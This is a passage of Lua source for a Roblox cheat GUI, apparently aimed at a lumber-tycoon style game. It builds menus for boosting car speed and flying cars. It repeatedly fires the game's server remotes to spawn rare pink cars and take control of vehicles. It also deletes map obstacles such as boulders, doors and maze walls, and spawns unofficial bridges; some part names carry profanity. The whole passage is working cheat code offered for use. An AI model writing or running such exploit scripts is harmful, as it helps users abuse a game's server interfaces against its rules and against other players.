        CountItems200.Text = CountItemsF("Bobblehead6", PlyrSelz.Text)
        wait(.05)
        CountItems201.Text = CountItemsF("Bobblehead7", PlyrSelz.Text)
    end
end)



toolamenu = Instance.new("ImageButton")
toolamenu.Name = "toolamenu"
toolamenu.Parent = Picker
toolamenu.BackgroundColor3 = Color3.fromRGB(196, 40, 28)
toolamenu.BorderColor3 = Color3.new(0, 0, 0)
toolamenu.Position = UDim2.new(0, 15, 0, 345)
toolamenu.Size = UDim2.new(0, 80, 0, 80)
toolamenu.ZIndex = 3
toolamenu.Image = "rbxassetid://4905880190"
toolamenu.ScaleType = Enum.ScaleType.Crop
toolamenu.MouseButton1Click:Connect(function()
CurrentItem.Image = "rbxassetid://4905880190"
  makesound("rbxassetid://156785206")
AIntroImage.Visible = false
AIntroImage1.Visible = false
AIntroImage2.Visible = false
AIntroImage3.Visible = false
TimesFrame.Visible = true

end)
toolaFrame = Instance.new("Frame")
toolaFrame.Name = "toolaFrame"
toolaFrame.Parent = MenuFrame
toolaFrame.BorderSizePixel = 1
toolaFrame.BackgroundTransparency = 0.5
toolaFrame.BorderColor3 = Color3.new(0, 0, 0)
toolaFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
toolaFrame.Size = UDim2.new(0, 170, 0, 442)
toolaFrame.Visible = false

CarToolsa = Instance.new('TextLabel')
CarToolsa.Name = "CarToolsa"
CarToolsa.Parent = toolaFrame
CarToolsa.BackgroundColor3 = Color3.new(255, 0, 0)
CarToolsa.BackgroundTransparency = 0
CarToolsa.BorderColor3 = Color3.fromRGB(151, 0, 0)
CarToolsa.Position = UDim2.new(0, 2, 0, 3)
CarToolsa.Size = UDim2.new(0, 166, 0, 20)
CarToolsa.Font = Enum.Font.Fantasy
CarToolsa.Text = "--Car Tools--"
CarToolsa.TextColor3 = Color3.new(1, 1, 1)
CarToolsa.TextSize = 14

CARAs = Instance.new("TextBox")
CARAs.Name = "CARAs"
CARAs.Parent = toolaFrame
CARAs.BackgroundColor3 = Color3.new(0, 0, 0)
CARAs.BorderColor3 = Color3.new(1, 0, 0)
CARAs.BackgroundTransparency = 0.6
CARAs.Position = UDim2.new(0, 147, 0, 26)
CARAs.Size = UDim2.new(0, 21, 0, 20)
CARAs.Font = Enum.Font.Fantasy
CARAs.Text = "1"
CARAs.TextColor3 = Color3.new(1, 1, 1)
CARAs.TextSize = 14

CARA = Instance.new("TextButton")
CARA.Name = "CARA"
CARA.Parent = toolaFrame
CARA.BackgroundColor3 = Color3.new(0, 0, 0)
CARA.BorderColor3 = Color3.new(1, 0, 0)
CARA.BackgroundTransparency = 0.6
CARA.Position =  UDim2.new(0, 3, 0, 26)
CARA.Size = UDim2.new(0, 140, 0, 20)
CARA.Font = Enum.Font.Fantasy
CARA.Text = "Fast Car"
CARA.TextColor3 = Color3.new(1, 1, 1)
CARA.TextSize = 14
CARA.MouseButton1Down:connect(function()
  makesound("rbxassetid://156785206")
CARA.BackgroundColor3 = Color3.new(0, 0, 0)
CARA.TextColor3 = Color3.new(0, 1, 0)
	game.Workspace.PlayerModels.ChildAdded:connect(function(ADDED)
 wait(0.5)
if ADDED:FindFirstChild('Configuration') then
 if ADDED.Configuration:FindFirstChild('MaxSpeed') then
  ADDED.Configuration.MaxSpeed.Value = CARAs.Text 
 end
 end
end)
end)


InfoText32 = Instance.new("TextLabel")
InfoText32.Name = "InfoText2"
InfoText32.Parent = MainFrame
InfoText32.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
InfoText32.BorderColor3 = Color3.new(0, 0, 0)
InfoText32.BackgroundTransparency = 0
InfoText32.Position = UDim2.new(0, 182, 0, 260)
InfoText32.Size = UDim2.new(0, 150, 0, 150)
InfoText32.TextColor3 = Color3.fromRGB(245, 205, 48)
InfoText32.Font = Enum.Font.Fantasy
InfoText32.Text =  "Fast Car\n\n1.Click Fast Car.\n2.Enter the speed you want to go (1 -5).\n3.Respawn car."
InfoText32.TextSize = 14
InfoText32.TextWrapped = true
InfoText32.Visible = false

CARA.MouseEnter:connect(function()
InfoText32.Visible = true
end)

CARA.MouseLeave:connect(function()
InfoText32.Visible = false
end)

PinkCar = Instance.new("TextButton")
PinkCar.Name = "PinkCar"
PinkCar.Parent = toolaFrame
PinkCar.BackgroundColor3 = Color3.new(0, 0, 0)
PinkCar.BorderColor3 = Color3.new(1, 0, 0)
PinkCar.BackgroundTransparency = 0.6
PinkCar.Position =  UDim2.new(0, 3, 0, 49)
PinkCar.Size = UDim2.new(0, 140, 0, 20)
PinkCar.Font = Enum.Font.Fantasy
PinkCar.Text = "Pink Car Spawner"
PinkCar.TextColor3 = Color3.new(1, 1, 1)
PinkCar.TextSize = 14

PinkCars = Instance.new("TextButton")
PinkCars.Name = "PinkCars"
PinkCars.Parent = toolaFrame
PinkCars.BackgroundColor3 = Color3.new(0, 0, 0)
PinkCars.BorderColor3 = Color3.new(1, 0, 0)
PinkCars.BackgroundTransparency = 0.6
PinkCars.Position = UDim2.new(0, 147, 0, 49)
PinkCars.Size = UDim2.new(0, 21, 0, 20)
PinkCars.Font = Enum.Font.Fantasy
PinkCars.Text = "C"
PinkCars.TextColor3 = Color3.new(1, 1, 1)
PinkCars.TextSize = 14

PinkCar.MouseButton1Click:connect(function()
	                     PinkCars.TextColor3 = Color3.new(0, 1, 0)
                     PinkCar.TextColor3 = Color3.new(0, 1, 0)
	if _G.Executed == false or _G.Executed == nil then
_G.Executed = true
Spawned = false
Spawning = false
SpawnPad = nil
workspace.PlayerModels.ChildAdded:connect(function(Added)
    if Spawned == false and Spawning == false then 
		Owner = nil
		CheckTries = 0
		CheckSuccess = false
		repeat
		wait() 
		CheckTries = CheckTries + 1
		if Added:FindFirstChild("Owner") and Added:FindFirstChild("Type") and Added.Type.Value == "Vehicle" and Added:FindFirstChild("Settings") and Added.Settings:FindFirstChild("Color") then 
			CheckSuccess = true
			Owner = Added.Owner.Value
		end
		until CheckTries == 75 or CheckSuccess == true
		if Owner == game.Players.LocalPlayer or game.ReplicatedStorage.Interaction.ClientIsWhitelisted:InvokeServer(Owner) == true then
			Spawning = true
            Added:WaitForChild("Settings")
            Added.Settings:WaitForChild("Color")
            if tostring(Added.Settings.Color.Value) == tostring(1032) then
				Spawned = true
            	Spawning = false
            	print(Spawned)
            elseif tostring(Added.Settings.Color.Value) ~= tostring(1032) then
				if SpawnPad:FindFirstChild("ButtonRemote_SpawnButton") and SpawnPad:FindFirstChild("Owner") then 
					if SpawnPad.Owner.Value == game.Players.LocalPlayer or game.ReplicatedStorage.Interaction.ClientIsWhitelisted:InvokeServer(SpawnPad.Owner.Value) == true then 
						Spawning = false
            	        game.ReplicatedStorage.Interaction.RemoteProxy:FireServer(SpawnPad.ButtonRemote_SpawnButton)
                    end
                end
            end
        end
    end
end)

mouse = game.Players.LocalPlayer:GetMouse()
mouse.KeyDown:connect(function(key)
    if key:lower() == "c" then
	    if mouse.Target.Parent:FindFirstChild("ButtonRemote_SpawnButton") then 
            SpawnPad = mouse.Target.Parent
            Spawned = false
            Spawning = false
            game.ReplicatedStorage.Interaction.RemoteProxy:FireServer(mouse.Target.Parent.ButtonRemote_SpawnButton)
	    else 
		    Spawned = true
		    Spawning = false
		end
    end
end)
end
spawn(function()
	repeat
		wait()
	if Spawned == true then
		Spawned = false
		game:GetService("StarterGui"):SetCore("SendNotification", {
		  Title = "Pink Car",
		  Text = "Successful Spawned."
		})
	end
	until Spawned == true
end)
end)

InfoText33 = Instance.new("TextLabel")
InfoText33.Name = "InfoText2"
InfoText33.Parent = MainFrame
InfoText33.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
InfoText33.BorderColor3 = Color3.new(0, 0, 0)
InfoText33.BackgroundTransparency = 0
InfoText33.Position = UDim2.new(0, 182, 0, 260)
InfoText33.Size = UDim2.new(0, 150, 0, 150)
InfoText33.TextColor3 = Color3.fromRGB(245, 205, 48)
InfoText33.Font = Enum.Font.Fantasy
InfoText33.Text =  "Johiro Pink Car Spawner\n\n1.Click Pink Car Spawner.\n2.Place mouse over Spawn Button on car pad .\n3.Press C on your keyboard."
InfoText33.TextSize = 14
InfoText33.TextWrapped = true
InfoText33.Visible = false

PinkCar.MouseEnter:connect(function()
InfoText33.Visible = true
end)

PinkCar.MouseLeave:connect(function()
InfoText33.Visible = false
end)

CarRotate = Instance.new("TextButton")
CarRotate.Name = "CarRotate"
CarRotate.Parent = toolaFrame
CarRotate.BackgroundColor3 = Color3.new(0, 0, 0)
CarRotate.BorderColor3 = Color3.new(1, 0, 0)
CarRotate.BackgroundTransparency = 0.6
CarRotate.Position =  UDim2.new(0, 3, 0, 72)
CarRotate.Size = UDim2.new(0, 140, 0, 20)
CarRotate.Font = Enum.Font.Fantasy
CarRotate.Text = "Car Rotater"
CarRotate.TextColor3 = Color3.new(1, 1, 1)
CarRotate.TextSize = 14

InfoText35 = Instance.new("TextLabel")
InfoText35.Name = "InfoText2"
InfoText35.Parent = MainFrame
InfoText35.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
InfoText35.BorderColor3 = Color3.new(0, 0, 0)
InfoText35.BackgroundTransparency = 0.2
InfoText35.Position = UDim2.new(0, 182, 0, 260)
InfoText35.Size = UDim2.new(0, 150, 0, 150)
InfoText35.TextColor3 = Color3.fromRGB(245, 205, 48)
InfoText35.Font = Enum.Font.Fantasy
InfoText35.Text =  "Johiro Car Rotater\n\n1.Just sit in your car.\n2.Click Car Rotater.\n3.Press R on your keyboard to turn your car back on its wheels."
InfoText35.TextSize = 14
InfoText35.TextWrapped = true
InfoText35.Visible = false

CarRotate.MouseEnter:connect(function()
InfoText35.Visible = true
end)

CarRotate.MouseLeave:connect(function()
InfoText35.Visible = false
end)

CarRotates = Instance.new("TextButton")
CarRotates.Name = "CarRotates"
CarRotates.Parent = toolaFrame
CarRotates.BackgroundColor3 = Color3.new(0, 0, 0)
CarRotates.BorderColor3 = Color3.new(1, 0, 0)
CarRotates.BackgroundTransparency = 0.6
CarRotates.Position = UDim2.new(0, 147, 0, 72)
CarRotates.Size = UDim2.new(0, 21, 0, 20)
CarRotates.Font = Enum.Font.Fantasy
CarRotates.Text = "R"
CarRotates.TextColor3 = Color3.new(1, 1, 1)
CarRotates.TextSize = 14

CarRotate.MouseButton1Click:connect(function()
  makesound("rbxassetid://156785206")
	local Turn = game:GetService("Players").LocalPlayer:GetMouse()
	function Turn2(key)
        	if (key == "r") then
			function RotateCar()
    if game.Players.LocalPlayer.Character then 
        Character = game.Players.LocalPlayer.Character
        if Character.Humanoid.SeatPart ~= nil then 
            Car = Character.Humanoid.SeatPart.Parent
            spawn(function()
            local Pos = CFrame.new(Car.Main.Position)
                for i=1,5 do
                    wait()
                    Car:SetPrimaryPartCFrame(Pos * CFrame.Angles(math.rad(Character.HumanoidRootPart.Orientation.x), math.rad(Character.HumanoidRootPart.Orientation.y), 0))
                    game.ReplicatedStorage.Interaction.ClientRequestOwnership:FireServer(Car.Main)
                    game.ReplicatedStorage.Interaction.ClientIsDragging:FireServer(Car.Main)
                end
            end)
        end
    end
end
RotateCar()
			end
		end
Turn.KeyDown:connect(Turn2)
end)

Carfly = Instance.new("TextButton")
Carfly.Name = "Carfly"
Carfly.Parent = toolaFrame
Carfly.BackgroundColor3 = Color3.new(0, 0, 0)
Carfly.BorderColor3 = Color3.new(1, 0, 0)
Carfly.BackgroundTransparency = 0.6
Carfly.Position =  UDim2.new(0, 3, 0, 95)
Carfly.Size = UDim2.new(0, 140, 0, 20)
Carfly.Font = Enum.Font.Fantasy
Carfly.Text = "Carfly"
Carfly.TextColor3 = Color3.new(1, 1, 1)
Carfly.TextSize = 14

CarflyA = Instance.new("TextBox")
CarflyA.Name = "CarflyAs"
CarflyA.Parent = toolaFrame
CarflyA.BackgroundColor3 = Color3.new(0, 0, 0)
CarflyA.BorderColor3 = Color3.new(1, 0, 0)
CarflyA.BackgroundTransparency = 0.6
CarflyA.Position = UDim2.new(0, 147, 0, 95)
CarflyA.Size = UDim2.new(0, 21, 0, 20)
CarflyA.Font = Enum.Font.Fantasy
CarflyA.Text = "Z"
CarflyA.TextColor3 = Color3.new(1, 1, 1)
CarflyA.TextSize = 14

Carfly.MouseButton1Click:connect(function()
  local hint = Instance.new("Hint",game.Players.LocalPlayer.PlayerGui)
   hint.Text = "Press Z To Toggle"
   hint.Name = game.JobId
repeat wait()
    until game.Players.LocalPlayer and game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:findFirstChild("Torso") and game.Players.LocalPlayer.Character:findFirstChild("Humanoid")
local mouse = game.Players.LocalPlayer:GetMouse()
repeat wait() until mouse
local plr = game.Players.LocalPlayer
local torso = plr.Character.Torso
local flying = true
local deb = true
local ctrl = {f = 0, b = 0, l = 0, r = 0}
local lastctrl = {f = 0, b = 0, l = 0, r = 0}
local maxspeed = 250
local speed = 0
 
function Fly()
local bg = Instance.new("BodyGyro", torso)
bg.P = 9e4
bg.maxTorque = Vector3.new(9e9, 9e9, 9e9)
bg.cframe = torso.CFrame
local bv = Instance.new("BodyVelocity", torso)
bv.velocity = Vector3.new(0,0.1,0)
bv.maxForce = Vector3.new(9e9, 9e9, 9e9)
repeat wait()
plr.Character.Humanoid.PlatformStand = false
if ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0 then
speed = speed+125.0+(speed/maxspeed)
if speed > maxspeed then
speed = maxspeed
end
elseif not (ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0) and speed ~= 0 then
speed = speed-250
if speed < 0 then
speed = 0
end
end
if (ctrl.l + ctrl.r) ~= 0 or (ctrl.f + ctrl.b) ~= 0 then
bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (ctrl.f+ctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(ctrl.l+ctrl.r,(ctrl.f+ctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed
lastctrl = {f = ctrl.f, b = ctrl.b, l = ctrl.l, r = ctrl.r}
elseif (ctrl.l + ctrl.r) == 0 and (ctrl.f + ctrl.b) == 0 and speed ~= 0 then
bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (lastctrl.f+lastctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(lastctrl.l+lastctrl.r,(lastctrl.f+lastctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed
else
bv.velocity = Vector3.new(0,0.1,0)
end
bg.cframe = game.Workspace.CurrentCamera.CoordinateFrame * CFrame.Angles(-math.rad((ctrl.f+ctrl.b)*50*speed/maxspeed),0,0)
until not flying
ctrl = {f = 0, b = 0, l = 0, r = 0}
lastctrl = {f = 0, b = 0, l = 0, r = 0}
speed = 0
bg:Destroy()
bv:Destroy()
plr.Character.Humanoid.PlatformStand = false
end
mouse.KeyDown:connect(function(key)
if key:lower() == "z" then
if flying then flying = false
else
flying = true
Fly()
end
elseif key:lower() == "w" then
ctrl.f = 1
elseif key:lower() == "s" then
ctrl.b = -1
elseif key:lower() == "a" then
ctrl.l = -1
elseif key:lower() == "d" then
ctrl.r = 1
end
end)
mouse.KeyUp:connect(function(key)
if key:lower() == "w" then
ctrl.f = 0
elseif key:lower() == "s" then
ctrl.b = 0
elseif key:lower() == "a" then
ctrl.l = 0
elseif key:lower() == "d" then
ctrl.r = 0
end
wait(5)
hint:Destroy()
end)
Fly()
end)

Brid = Instance.new("TextLabel")
Brid.Name = "Bridge"
Brid.Parent = toolaFrame
Brid.BackgroundColor3 = Color3.new(0, 0, 0)
Brid.BorderColor3 = Color3.new(1, 0, 0)
Brid.BackgroundTransparency = 0.6
Brid.Position =  UDim2.new(0, 3, 0, 118)
Brid.Size = UDim2.new(0, 115, 0, 20)
Brid.Font = Enum.Font.Fantasy
Brid.Text = "Bridge"
Brid.TextColor3 = Color3.new(1, 1, 1)
Brid.TextSize = 14

Bridup = Instance.new("TextButton")
Bridup.Name = "Bridge"
Bridup.Parent = toolaFrame
Bridup.BackgroundColor3 = Color3.new(0, 0, 0)
Bridup.BorderColor3 = Color3.new(1, 0, 0)
Bridup.BackgroundTransparency = 0.6
Bridup.Position =  UDim2.new(0, 147, 0, 118)
Bridup.Size = UDim2.new(0, 21, 0, 20)
Bridup.Font = Enum.Font.Fantasy
Bridup.Text = "U"
Bridup.TextColor3 = Color3.new(1, 1, 1)
Bridup.TextSize = 14

BridDown = Instance.new("TextButton")
BridDown.Name = "Bridge"
BridDown.Parent = toolaFrame
BridDown.BackgroundColor3 = Color3.new(0, 0, 0)
BridDown.BorderColor3 = Color3.new(1, 0, 0)
BridDown.BackgroundTransparency = 0.6
BridDown.Position =  UDim2.new(0, 122, 0, 118)
BridDown.Size = UDim2.new(0, 21, 0, 20)
BridDown.Font = Enum.Font.Fantasy
BridDown.Text = "D"
BridDown.TextColor3 = Color3.new(1, 1, 1)
BridDown.TextSize = 14

local BridgeD = false
BridDown.MouseButton1Click:connect(function()
  makesound("rbxassetid://156785206")
	if BridgeD == false then
			for _,v in pairs(game.workspace.Bridge.VerticalLiftBridge.Lift:GetChildren()) do
			v.CFrame = v.CFrame + Vector3.new(0, -26, 0)
			end
		BridgeD = true
	end
end)

Bridup.MouseButton1Click:connect(function()
  makesound("rbxassetid://156785206")
	if BridgeD == true then

			for _,v in pairs(game.workspace.Bridge.VerticalLiftBridge.Lift:GetChildren()) do
			v.CFrame = v.CFrame + Vector3.new(0, 26, 0)
			end
		BridgeD = false
	end
end)

ModToolsa = Instance.new('TextLabel')
ModToolsa.Name = "ModToolsa"
ModToolsa.Parent = toolaFrame
ModToolsa.BackgroundColor3 = Color3.new(255, 0, 0)
ModToolsa.BackgroundTransparency = 0
ModToolsa.BorderColor3 = Color3.fromRGB(151, 0, 0)
ModToolsa.Position = UDim2.new(0, 2, 0, 141)
ModToolsa.Size = UDim2.new(0, 166, 0, 20)
ModToolsa.Font = Enum.Font.Fantasy
ModToolsa.Text = "--Mod Tools--"
ModToolsa.TextColor3 = Color3.new(1, 1, 1)
ModToolsa.TextSize = 14

RemoveTitle = Instance.new("TextLabel")
RemoveTitle.Name = "RemoveTitle"
RemoveTitle.Parent = toolaFrame
RemoveTitle.BackgroundColor3 = Color3.new(0, 0, 0)
RemoveTitle.BorderColor3 = Color3.new(1, 0, 0)
RemoveTitle.BackgroundTransparency = 0.6
RemoveTitle.Position = UDim2.new(0, 3, 0, 164)
RemoveTitle.Size = UDim2.new(0, 165, 0, 20)
RemoveTitle.Font = Enum.Font.Fantasy
RemoveTitle.Text = "-- Removing --"
RemoveTitle.TextColor3 = Color3.new(0, 1, 0)
RemoveTitle.TextSize = 15

LavaBoulders = Instance.new("TextButton")
LavaBoulders.Name = "LavaBoulders"
LavaBoulders.Parent = toolaFrame
LavaBoulders.BackgroundColor3 = Color3.new(0, 0, 0)
LavaBoulders.BorderColor3 = Color3.new(1, 0, 0)
LavaBoulders.BackgroundTransparency = 0.6
LavaBoulders.Position = UDim2.new(0, 3, 0, 187)
LavaBoulders.Size = UDim2.new(0, 165, 0, 20)
LavaBoulders.Font = Enum.Font.Fantasy
LavaBoulders.Text = "Lava Boulders"
LavaBoulders.TextColor3 = Color3.new(1, 1, 1)
LavaBoulders.TextSize = 14

LavaBoulders.MouseButton1Click:Connect(function()
	local destroy = true

	local boulders = workspace.Region_Volcano:FindFirstChild("PartSpawner")

	while destroy == true do
    	for i, v in pairs(boulders:GetChildren()) do
        	v:Destroy()
    	end
    	wait(2)
	end
end)

IceBoulders = Instance.new("TextButton")
IceBoulders.Name = "IceBoulders"
IceBoulders.Parent = toolaFrame
IceBoulders.BackgroundColor3 = Color3.new(0, 0, 0)
IceBoulders.BorderColor3 = Color3.new(1, 0, 0)
IceBoulders.BackgroundTransparency = 0.6
IceBoulders.Position = UDim2.new(0, 3, 0, 210)
IceBoulders.Size = UDim2.new(0, 165, 0, 20)
IceBoulders.Font = Enum.Font.Fantasy
IceBoulders.Text = "Ice Boulders"
IceBoulders.TextColor3 = Color3.new(1, 1, 1)
IceBoulders.TextSize = 14
IceBoulders.MouseButton1Click:Connect(function()
	local remove = true

	local boulders = workspace.Region_Snow:FindFirstChild("PartSpawner")

	while remove == true do
    	for i, v in pairs(boulders:GetChildren()) do
       	 	v:Destroy()
   	 	end
    	wait(60)
	end
end)

ShrineDoors = Instance.new("TextButton")
ShrineDoors.Name = "ShrineDoors"
ShrineDoors.Parent = toolaFrame
ShrineDoors.BackgroundColor3 = Color3.new(0, 0, 0)
ShrineDoors.BorderColor3 = Color3.new(1, 0, 0)
ShrineDoors.BackgroundTransparency = 0.6
ShrineDoors.Position = UDim2.new(0, 3, 0, 233)
ShrineDoors.Size = UDim2.new(0, 165, 0, 20)
ShrineDoors.Font = Enum.Font.Fantasy
ShrineDoors.Text = "Shrine Doors"
ShrineDoors.TextColor3 = Color3.new(1, 1, 1)
ShrineDoors.TextSize = 14
ShrineDoors.MouseButton1Click:Connect(function()
	workspace.Region_Mountainside.BoulderRegen.Boulder:Destroy()
	workspace.Region_Mountainside.Door.Door:Destroy()
end)

MazeWalls = Instance.new("TextButton")
MazeWalls.Name = "MazeWalls"
MazeWalls.Parent = toolaFrame
MazeWalls.BackgroundColor3 = Color3.new(0, 0, 0)
MazeWalls.BorderColor3 = Color3.new(1, 0, 0)
MazeWalls.BackgroundTransparency = 0.6
MazeWalls.Position = UDim2.new(0, 3, 0, 256)
MazeWalls.Size = UDim2.new(0, 165, 0, 20)
MazeWalls.Font = Enum.Font.Fantasy
MazeWalls.Text = "Maze Walls"
MazeWalls.TextColor3 = Color3.new(1, 1, 1)
MazeWalls.TextSize = 14
MazeWalls.MouseButton1Click:Connect(function()
	local blockades = workspace.Region_MazeCave.Blockade

	for i, v in pairs(blockades:GetChildren()) do
    	v:Destroy()
	end
end)

BridgesTitle = Instance.new("TextLabel")
BridgesTitle.Name = "BridgesTitle"
BridgesTitle.Parent = toolaFrame
BridgesTitle.BackgroundColor3 = Color3.new(0, 0, 0)
BridgesTitle.BorderColor3 = Color3.new(1, 0, 0)
BridgesTitle.BackgroundTransparency = 0.6
BridgesTitle.Position = UDim2.new(0, 3, 0, 279)
BridgesTitle.Size = UDim2.new(0, 165, 0, 20)
BridgesTitle.Font = Enum.Font.Fantasy
BridgesTitle.Text = "-- Bridges --"
BridgesTitle.TextColor3 = Color3.new(0, 1, 0)
BridgesTitle.TextSize = 14

PalmBridge = Instance.new("TextButton")
PalmBridge.Name = "PalmBridge"
PalmBridge.Parent = toolaFrame
PalmBridge.BackgroundColor3 = Color3.new(0, 0, 0)
PalmBridge.BorderColor3 = Color3.new(1, 0, 0)
PalmBridge.BackgroundTransparency = 0.6
PalmBridge.Position = UDim2.new(0, 3, 0, 302)
PalmBridge.Size = UDim2.new(0, 165, 0, 20)
PalmBridge.Font = Enum.Font.Fantasy
PalmBridge.Text = "Main To Palm"
PalmBridge.TextColor3 = Color3.new(1, 1, 1)
PalmBridge.TextSize = 14
PalmBridge.MouseButton1Click:Connect(function()
	local palm1 = Instance.new("Part", workspace)
	palm1.Name = "K Truck's Goin' There"
	palm1.Position = Vector3.new(1753.475, -10, -45.351)
	palm1.Size = Vector3.new(1600, 1, 50)
	palm1.BrickColor = BrickColor.Random()
	palm1.Anchored = true
end)

SafariBridge = Instance.new("TextButton")
SafariBridge.Name = "SafariBridge"
SafariBridge.Parent = toolaFrame
SafariBridge.BackgroundColor3 = Color3.new(0, 0, 0)
SafariBridge.BorderColor3 = Color3.new(1, 0, 0)
SafariBridge.BackgroundTransparency = 0.6
SafariBridge.Position = UDim2.new(0, 3, 0, 325)
SafariBridge.Size = UDim2.new(0, 165, 0, 20)
SafariBridge.Font = Enum.Font.Fantasy
SafariBridge.Text = "Main To Safari"
SafariBridge.TextColor3 = Color3.new(1, 1, 1)
SafariBridge.TextSize = 14
SafariBridge.MouseButton1Click:Connect(function()
	local bridge1 = Instance.new("Part", workspace)
	bridge1.Name = "Lol We Made Our Own Fuck Your ?100"
	bridge1.Position = Vector3.new(174.511, 1.049, -882.842)
	bridge1.Size = Vector3.new(60, 0.1, 350)
	bridge1.BrickColor = BrickColor.Random()
	wait(0.5)
	bridge1.Anchored = true

	local bridge2 = Instance.new("Part", workspace)
	bridge2.Name = "Lol We Made Our Own Fuck Your ?100 Again"
	bridge2.Position = Vector3.new(49.602, 1.049, -882.842)
	bridge2.Size = Vector3.new(60, 0.1, 350)
	bridge2.BrickColor = BrickColor.Random()
	wait(0.5)
	bridge2.Anchored = true
end)

GoldBridge = Instance.new("TextButton")
GoldBridge.Name = "GoldBridge"
GoldBridge.Parent = toolaFrame
GoldBridge.BackgroundColor3 = Color3.new(0, 0, 0)
GoldBridge.BorderColor3 = Color3.new(1, 0, 0)
GoldBridge.BackgroundTransparency = 0.6
GoldBridge.Position = UDim2.new(0, 3, 0, 348)
GoldBridge.Size = UDim2.new(0, 165, 0, 20)
GoldBridge.Font = Enum.Font.Fantasy
GoldBridge.Text = "Car To Swamp"
GoldBridge.TextColor3 = Color3.new(1, 1, 1)
GoldBridge.TextSize = 14
GoldBridge.MouseButton1Click:Connect(function()
	local bridge = Instance.new("Part", workspace)
	bridge.Name = "Lol We Made Our Own Fuck Your Shitty Broken Dynamite Slab"
	bridge.Position = Vector3.new(-1331.086, 293.25, 645.301)
	bridge.Size = Vector3.new(185, 0.1, 60)
	bridge.Orientation = Vector3.new(0, -75, 0)
	bridge.BrickColor = BrickColor.Random()
	wait(0.5)
	bridge.Anchored = true
end)

YellowBridge = Instance.new("TextButton")
YellowBridge.Name = "YellowBridge"
YellowBridge.Parent = toolaFrame
YellowBridge.BackgroundColor3 = Color3.new(0, 0, 0)
YellowBridge.BorderColor3 = Color3.new(1, 0, 0)
YellowBridge.BackgroundTransparency = 0.6
YellowBridge.Position = UDim2.new(0, 3, 0, 371)
YellowBridge.Size = UDim2.new(0, 165, 0, 20)
YellowBridge.Font = Enum.Font.Fantasy
YellowBridge.Text = "Main To Yellow"
YellowBridge.TextColor3 = Color3.new(1, 1, 1)
YellowBridge.TextSize = 14
YellowBridge.MouseButton1Click:Connect(function()
	local yellow = Instance.new("Part", workspace)
	yellow.Name = "Lol Truck There Easy"
	yellow.Position = Vector3.new(-517.915, -12, -392.256)
	yellow.Size = Vector3.new(1207.06, 1, 1460.09)
	yellow.BrickColor = BrickColor.Random()
	yellow.Anchored = true
end)
plr = game:GetService("Players").LocalPlayer

Platform = Instance.new("TextButton")
Platform.Name = "Platform"
Platform.Parent = toolaFrame
Platform.BackgroundColor3 = Color3.new(0, 0, 0)
Platform.BorderColor3 = Color3.new(1, 0, 0)
Platform.BackgroundTransparency = 0.6
Platform.Position = UDim2.new(0, 3, 0, 394)
Platform.Size = UDim2.new(0, 165, 0, 20)
Platform.Font = Enum.Font.Fantasy
Platform.Text = "Platform"
Platform.TextColor3 = Color3.new(1, 1, 1)
Platform.TextSize = 14
Platform.MouseButton1Click:connect(function()
	local p = Instance.new("Part", workspace)
	p.Size = Vector3.new(30,0.5,30)
	p.Anchored = true
	p.Position = plr.Character.HumanoidRootPart.Position + Vector3.new(0,15,0)
	plr.Character:MoveTo(p.Position + Vector3.new(0,1,0))
	spawn(function()
		while p.Parent do
			wait(1)
			if (plr.Character.HumanoidRootPart.Position - p.Position).magnitude > 16 then
				p:Destroy()
			end
		end
	end)
end)

Drivable = Instance.new("TextButton")
Drivable.Name = "Drivable"
Drivable.Parent = toolaFrame
Drivable.BackgroundColor3 = Color3.new(0, 0, 0)
Drivable.BorderColor3 = Color3.new(1, 0, 0)
Drivable.BackgroundTransparency = 0.6
Drivable.Position = UDim2.new(0, 3, 0, 417)
Drivable.Size = UDim2.new(0, 165, 0, 20)
Drivable.Font = Enum.Font.Fantasy
Drivable.Text = "Drivable Areas"
Drivable.TextColor3 = Color3.new(1, 1, 1)
Drivable.TextSize = 14
Drivable.MouseButton1Click:Connect(function()
	local Model = Instance.new("Model", game:GetService("Workspace"))
	Model.Name = "Lumber"
	
	local Part1 = Instance.new("Part", Model)
	Part1.Name = "Bridge"
	Part1.Reflectance = 0
	Part1.Transparency = 0
	Part1.Anchored = true
	Part1.Archivable = true
	Part1.CanCollide = false
	Part1.Locked = false
	Part1.BrickColor = BrickColor.new("Medium green")
	Part1.Material = Enum.Material.Fabric
	Part1.Position = Vector3.new(4380.8090820313, -11.749999046326, -101.56007385254)
	Part1.Size = Vector3.new(254.85998535156, 0.10000000149012, 1012.0200805664)
	Part1.Rotation = Vector3.new(0, 0, 0)
	
	local Part2 = Instance.new("Part", Model)
	Part2.Name = "Part"
	Part2.Reflectance = 0
	Part2.Transparency = 0
	Part2.Anchored = true
	Part2.Archivable = true
	Part2.CanCollide = false
	Part2.Locked = false
	Part2.BrickColor = BrickColor.new("Medium green")
	Part2.Material = Enum.Material.Fabric
	Part2.Position = Vector3.new(-1498.7203369141, 628.11077880859, 1146.8332519531)
	Part2.Size = Vector3.new(54.889999389648, 0.38999998569489, 46.719993591309)
	Part2.Rotation = Vector3.new(0, 30, 0)
	
	local Part3 = Instance.new("Part", Model)
	Part3.Name = "RoadVol"
	Part3.Reflectance = 0
	Part3.Transparency = 0
	Part3.Anchored = true
	Part3.Archivable = true
	Part3.CanCollide = false
	Part3.Locked = false
	Part3.BrickColor = BrickColor.new("Medium green")
	Part3.Material = Enum.Material.Fabric
	Part3.Position = Vector3.new(-604.03656005859, 301.07205200195, 637.69116210938)
	Part3.Size = Vector3.new(40, 0.20000000298023, 2030.8299560547)
	Part3.Rotation = Vector3.new(147.75, 55.680000305176, -152.4700012207)
	
	local Part4 = Instance.new("Part", Model)
	Part4.Name = "Water1"
	Part4.Reflectance = 0
	Part4.Transparency = 0
	Part4.Anchored = true
